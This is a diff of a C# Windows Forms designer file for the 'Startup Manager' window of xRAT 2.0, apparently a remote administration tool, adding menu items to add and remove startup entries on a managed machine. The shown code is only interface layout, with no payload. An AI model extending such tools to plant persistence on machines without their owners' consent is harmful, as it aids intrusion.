@@ -30,11 +30,38 @@
         {
             this.components = new System.ComponentModel.Container();
             System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(FrmStartupManager));
+            this.ctxtMenu = new System.Windows.Forms.ContextMenuStrip(this.components);
+            this.ctxtAddEntry = new System.Windows.Forms.ToolStripMenuItem();
+            this.ctxtRemoveEntry = new System.Windows.Forms.ToolStripMenuItem();
             this.lstStartupItems = new xServer.Controls.ListViewEx();
             this.hName = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
             this.hPath = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
-            this.ctxtMenu = new System.Windows.Forms.ContextMenuStrip(this.components);
+            this.ctxtMenu.SuspendLayout();
             this.SuspendLayout();
+            // 
+            // ctxtMenu
+            // 
+            this.ctxtMenu.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
+            this.ctxtAddEntry,
+            this.ctxtRemoveEntry});
+            this.ctxtMenu.Name = "ctxtMenu";
+            this.ctxtMenu.Size = new System.Drawing.Size(148, 48);
+            // 
+            // ctxtAddEntry
+            // 
+            this.ctxtAddEntry.Image = global::xServer.Properties.Resources.application_add;
+            this.ctxtAddEntry.Name = "ctxtAddEntry";
+            this.ctxtAddEntry.Size = new System.Drawing.Size(147, 22);
+            this.ctxtAddEntry.Text = "Add Entry";
+            this.ctxtAddEntry.Click += new System.EventHandler(this.ctxtAddEntry_Click);
+            // 
+            // ctxtRemoveEntry
+            // 
+            this.ctxtRemoveEntry.Image = global::xServer.Properties.Resources.application_delete;
+            this.ctxtRemoveEntry.Name = "ctxtRemoveEntry";
+            this.ctxtRemoveEntry.Size = new System.Drawing.Size(147, 22);
+            this.ctxtRemoveEntry.Text = "Remove Entry";
+            this.ctxtRemoveEntry.Click += new System.EventHandler(this.ctxtRemoveEntry_Click);
             // 
             // lstStartupItems
             // 
@@ -46,6 +73,7 @@
             this.hPath});
             this.lstStartupItems.ContextMenuStrip = this.ctxtMenu;
             this.lstStartupItems.FullRowSelect = true;
+            this.lstStartupItems.GridLines = true;
             this.lstStartupItems.Location = new System.Drawing.Point(12, 12);
             this.lstStartupItems.Name = "lstStartupItems";
             this.lstStartupItems.Size = new System.Drawing.Size(653, 349);
@@ -64,11 +92,6 @@
             this.hPath.Text = "Path";
             this.hPath.Width = 460;
             // 
-            // ctxtMenu
-            // 
-            this.ctxtMenu.Name = "ctxtMenu";
-            this.ctxtMenu.Size = new System.Drawing.Size(61, 4);
-            // 
             // FrmStartupManager
             // 
             this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
@@ -83,6 +106,7 @@
             this.Text = "xRAT 2.0 - Startup Manager []";
             this.FormClosing += new System.Windows.Forms.FormClosingEventHandler(this.FrmStartupManager_FormClosing);
             this.Load += new System.EventHandler(this.FrmStartupManager_Load);
+            this.ctxtMenu.ResumeLayout(false);
             this.ResumeLayout(false);
 
         }
@@ -93,6 +117,8 @@
         private System.Windows.Forms.ColumnHeader hName;
         private System.Windows.Forms.ColumnHeader hPath;
         private System.Windows.Forms.ContextMenuStrip ctxtMenu;
+        private System.Windows.Forms.ToolStripMenuItem ctxtAddEntry;
+        private System.Windows.Forms.ToolStripMenuItem ctxtRemoveEntry;
 
     }
 }
